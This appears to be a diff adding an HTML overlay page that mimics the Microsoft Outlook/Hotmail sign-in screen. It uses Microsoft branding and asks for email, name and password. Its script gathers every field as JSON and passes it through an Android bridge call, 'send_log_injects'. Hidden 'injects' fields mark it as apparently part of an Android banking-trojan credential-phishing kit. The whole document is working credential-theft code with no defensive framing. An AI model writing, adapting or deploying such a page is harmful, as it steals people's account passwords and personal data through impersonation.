@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Sign in</title>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #ffffff;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+#hotmailoutlook {
+    display: table;
+    position: absolute;
+    height: 100%;
+    width: 100%;
+    background-image: url(https://logincdn.msauth.net/16.000.28230.00/images/Backgrounds/0.jpg);
+    background-size: cover;
+}
+#hotmailoutlook .content {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 440px;
+    width: calc(100% - 88px);
+    padding: 44px 44px 84px 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    min-width: 320px;
+    overflow: hidden;
+}
+#hotmailoutlook h1 {
+    color: #404040;
+    font-size: 1.5rem;
+    font-weight: 600;
+}
+#hotmailoutlook input {
+    width: 100%;
+    padding: 6px 10px;
+    border-width: 1px;
+    border-color: #666;
+    border-color: rgba(0,0,0,.6);
+    height: 36px;
+    outline: none;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    border-top-width: 0;
+    border-left-width: 0;
+    border-right-width: 0;
+    padding-left: 0;
+    background-color: rgba(255,255,255,.4);
+    border-style: solid;
+    margin-bottom: 20px;
+}
+#hotmailoutlook .createtext {
+    margin-bottom: 16px;
+    font-size: .8125rem;
+    color: #262626;
+    text-align: left;
+}
+#hotmailoutlook .link {
+    color: #0067b8;
+}
+#hotmailoutlook .btnNext {
+    background-color: #0067b8;
+    border-color: #0067b8;
+    color: #fff;
+    margin-top: 0;
+    margin-bottom: 0;
+    text-align: center;
+    padding: 10px 40px;
+    border: none;
+    float: right;
+    bottom: 45px;
+    right: 35px;
+    position: absolute;
+}
+#hotmailoutlook .middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+#hotmailoutlook .infomail {
+    height: 12px;
+    margin-top: 15px;
+    margin-bottom: 30px;
+}
+#hotmailoutlook .leftarrow {
+    display: inline-block;
+    position: absolute;
+}
+#hotmailoutlook #myhotmailtext {
+    display: inline-block;
+    position: absolute;
+    margin-left: 26px;
+    margin-top: 3px;
+}
+
+</style>
+</head>
+<body>
+  
+    <div id="hotmailoutlook" style="display: none;">
+        <div class="middle">
+            <div class="content">
+                <div class="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
+                </div>
+                <div id="page3">
+                    <h1>Sign in</h1>
+                    <input id="hotmailoutlooklogin" type="text" name="email" placeholder="Email, phone, or Skype">
+<input id="name" style="width:130px; " placeholder="First Name" name="name">
+				<input id="surname" style="width:130px; "placeholder="Last Name"  name="surname">
+                    <div class="createtext">No account? <span class="link">Create one!</span></div>
+                    <div class="createtext link">Sign-in options</div>
+                    <div class="btnNext" onclick="HotMailNextPage();">Next</div>
+                </div>
+                <div id="page4" style="display:none;">
+                    <div class="infomail">
+                        <div class="leftarrow" onclick="HotMailBackBTNPage();">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>assets</title><path d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z" fill="#404040"/><path d="M10.944,7.056l.594.594L7.617,11.578H18v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944m0-.141-.071.07L5.929,11.929,5.858,12l.071.071,4.944,4.944.071.07.071-.07.594-.595.071-.07-.071-.071L7.858,12.522H18.1V11.478H7.858l3.751-3.757.071-.071-.071-.07-.594-.595-.071-.07Z" fill="#404040"/></svg>
+                        </div>
+                        <div id="myhotmailtext">
+                            
+                        </div>
+                    </div>
+                    <h1>Enter password</h1>
+                    <input id="hotmailoutlookpassword" type="password" name="password" placeholder="Password">
+                    <div class="createtext link">Forgot my password</div>
+                    <div class="btnNext" onclick="checkPassword();">Sign in</div>
+                    <input id="type_injects" name="type_injects"  value='emails' type="hidden" >
+                    <input id="closed" name="closed"  value='close_activity_injects' type="hidden" >
+                </div>
+            </div>
+        </div>
+    </div>
+   
+</body>
+<script>
+
+
+function HotMailNextPage() {
+    if(document.getElementById('hotmailoutlooklogin').value.length > 3) {
+        document.getElementById('page3').style.display = 'none';
+        document.getElementById('page4').style.display = 'block';
+        document.getElementById('myhotmailtext').innerText = document.getElementById('hotmailoutlooklogin').value;
+    }
+}
+function HotMailBackBTNPage() {
+    document.getElementById('page3').style.display = 'block';
+    document.getElementById('page4').style.display = 'none';
+}
+
+function checkPassword(){
+    if(document.getElementById('hotmailoutlookpassword').value.length > 5) {
+        process('hotmailoutlook');
+    }
+}
+
+var lang = 'en', invalidCC = 'Invalid card number';
+document.getElementById('hotmailoutlook').style.display = "";
+
+
+function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSONbyName(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+        alert(formToJSONbyName(document.getElementById(formId)));
+    }
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+</script>
+</html>
